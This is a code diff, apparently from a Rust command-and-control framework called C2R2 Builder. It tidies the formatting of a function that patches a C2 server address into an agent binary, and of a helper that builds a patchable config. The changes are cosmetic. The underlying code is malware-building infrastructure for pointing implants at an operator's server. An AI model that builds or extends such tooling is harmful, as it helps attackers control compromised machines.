@@ -53,15 +53,15 @@ pub fn patch_agent_binary(
 
             // Create the new server string with padding
             let mut new_server_bytes = vec![0u8; MAX_SERVER_LENGTH + SERVER_MARKER.len()];
-            
+
             // Copy marker
             new_server_bytes[..SERVER_MARKER.len()].copy_from_slice(SERVER_MARKER);
-            
+
             // Copy new server address
             let server_bytes = new_server.as_bytes();
             new_server_bytes[SERVER_MARKER.len()..SERVER_MARKER.len() + server_bytes.len()]
                 .copy_from_slice(server_bytes);
-            
+
             // Null-terminate
             new_server_bytes[SERVER_MARKER.len() + server_bytes.len()] = 0;
 
@@ -75,11 +75,9 @@ pub fn patch_agent_binary(
             }
         }
         None => {
-            return Err(
-                "❌ Marcador no encontrado en el binario. \
+            return Err("❌ Marcador no encontrado en el binario. \
                 El binario debe ser compilado con soporte para patching."
-                    .into(),
-            );
+                .into());
         }
     }
 
@@ -95,10 +93,11 @@ pub fn patch_agent_binary(
 
 /// Generate a template agent with placeholder for patching
 /// This is used during the build process to create a base agent
+#[allow(dead_code)]
 pub fn prepare_patchable_config(c2_server: &str) -> String {
     // Create a config with a marker that can be found and replaced
-    let padded_server = format!("{:\0<width$}", c2_server, width = MAX_SERVER_LENGTH);
-    
+    let _padded_server = format!("{:\0<width$}", c2_server, width = MAX_SERVER_LENGTH);
+
     format!(
         r#"// Generado automáticamente por C2R2 Builder v2.0
 // Este archivo contiene un marcador para permitir patching binario
